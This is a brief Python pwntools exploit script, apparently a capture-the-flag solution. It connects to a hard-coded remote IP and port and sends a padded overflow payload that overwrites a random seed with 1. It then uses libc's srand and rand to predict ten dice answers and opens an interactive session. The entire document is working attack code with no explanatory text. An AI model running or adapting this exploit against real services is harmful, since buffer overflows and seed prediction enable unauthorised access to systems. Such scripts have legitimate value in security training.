from pwn import *
from ctypes import *
context(arch="amd64",os="linux",log_level="debug")
p=remote("111.198.29.45",31354)
p.recvuntil(":")
payload1="a"*0x20+p64(1)
p.sendline(payload1)
elf=cdll.LoadLibrary("libc.so.6")
elf.srand(1)
for i in range(10):
    p.recvuntil("number:")
    p.sendline(str(elf.rand()%6+1))
p.recvline()
p.interactive()
